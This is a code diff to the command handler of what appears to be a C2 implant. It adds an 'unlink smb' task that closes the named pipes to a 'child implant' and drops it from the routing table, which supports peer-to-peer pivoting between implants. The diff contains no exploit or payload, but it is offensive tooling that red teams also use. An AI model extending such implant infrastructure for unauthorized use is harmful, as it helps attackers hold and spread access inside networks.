@@ -296,7 +296,7 @@ nlohmann::json command_tree(nlohmann::json task_data) {
     /*
     Link commands
     */
-    else if (task_name == "link") {
+    else if (task_name == "link smb") {
         //update link class with info we need
 
         nlohmann::json result;
@@ -443,10 +443,43 @@ nlohmann::json command_tree(nlohmann::json task_data) {
             return result;
         }
     }
-    //else if (task_name == "unlink") {
-    //    //Delete link info from class & disconnect
+    else if (task_name == "unlink smb") {
+        nlohmann::json result;
 
-    //}
+        //make sure all of our args are present
+        auto& args = task_data["task"]["args"];
+        if (!args.contains("child_uuid") || !args["child_uuid"].is_string()) {
+            result["error"] = "Task failed: 'child_uuid' is missing or not a string";
+            return result;
+        }
+
+        std::string child_uuid = task_data["task"]["args"]["child_uuid"];
+
+        //init route stuff
+        ChildRouteInfo cri;
+
+        if (!ChildHandler::instance().get_child(child_uuid, cri) == 0) {
+            result["error"] = "Could not find child";
+            return result;
+        }
+
+        DEBUG_LOG("Unlinking child: " << child_uuid);
+
+        // Close the handles to the child implant
+        if (cri.h_pipe_inbox != INVALID_HANDLE_VALUE) {
+            WinApi::CloseHandle(cri.h_pipe_inbox);
+        }
+        if (cri.h_pipe_outbox != INVALID_HANDLE_VALUE) {
+            WinApi::CloseHandle(cri.h_pipe_outbox);
+        }
+
+        // nuke from routing table
+        ChildHandler::instance().remove_child(child_uuid);
+
+        result["message"] = "Successfully unlinked and closed pipes for child " + child_uuid;
+        result["windows_error_code"] = 0;
+        return result;
+    }
     /*
     Memstore commands
     */
